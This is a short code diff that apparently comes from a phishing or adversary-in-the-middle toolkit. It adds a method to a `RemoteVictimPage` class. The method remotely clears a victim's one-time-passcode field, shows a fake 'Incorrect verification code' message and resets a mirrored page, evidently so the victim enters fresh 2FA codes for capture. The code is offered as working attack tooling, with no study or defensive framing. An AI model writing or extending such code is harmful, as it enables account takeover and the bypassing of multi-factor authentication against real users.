@@ -321,6 +321,23 @@ class RemoteVictimPage:
             {"session": self._session, "cmd": {"op": "harbor-state", "state": state}},
         )
 
+    def wipe_harbor_otp(self, message: str) -> None:
+        msg = (message or "").strip() or "Incorrect verification code."
+        self._post_json(
+            self._cmd_path(),
+            {
+                "session": self._session,
+                "cmd": {"op": "harbor-wipe-otp", "message": msg},
+            },
+        )
+        self.push_harbor_state(
+            {
+                "verifyError": {"msg": msg},
+                "clearHarborOtp": True,
+                "mirrorLoading": False,
+            }
+        )
+
     def goto(self, url: str, **kwargs) -> None:
         self.flush_cmds(force=True)
         url = self._with_victim_query(url)
